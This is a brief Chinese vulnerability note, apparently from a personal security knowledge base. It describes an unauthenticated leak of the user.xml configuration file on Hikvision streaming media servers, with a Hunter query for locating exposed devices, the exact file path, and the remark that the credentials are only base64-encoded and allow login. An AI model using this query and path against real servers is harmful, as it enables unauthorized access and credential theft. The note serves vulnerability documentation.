# 海康威视流媒体管理服务器 user.xml 账号密码泄漏漏洞

# 一、漏洞简介
HIKVISION 流媒体管理服务器配置文件未做鉴权，攻击者通过漏洞可以获取网站账号密码

# 二、影响版本
+ HIKVISION 流媒体管理服务器

# 三、资产测绘
+ hunter：`web.body="流媒体管理服务器"&&web.body="杭州海康威视系统技术有限公司 版权所有"`

![1691852350086-59553de6-b647-4dde-8c1b-77f90d88762d.png](./img/W2pLsDAqUjtLCdE8/1691852350086-59553de6-b647-4dde-8c1b-77f90d88762d-861201.png)

+ 登录页面

![1691852369924-5fa9d9eb-7580-4355-bf97-6d42fcbf083f.png](./img/W2pLsDAqUjtLCdE8/1691852369924-5fa9d9eb-7580-4355-bf97-6d42fcbf083f-150590.png)

# 四、漏洞复现
```plain
  /config/user.xml
```

![1691852415460-c3a7cb87-9703-4d03-b952-fbd260cb3f71.png](./img/W2pLsDAqUjtLCdE8/1691852415460-c3a7cb87-9703-4d03-b952-fbd260cb3f71-670431.png)

账号密码为base64加密

测试登录，登录成功

![1691852465095-1abcb3c1-7dc6-4873-b8e8-a24ea2499ef4.png](./img/W2pLsDAqUjtLCdE8/1691852465095-1abcb3c1-7dc6-4873-b8e8-a24ea2499ef4-075512.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xz0uizp3x0yzr3kl>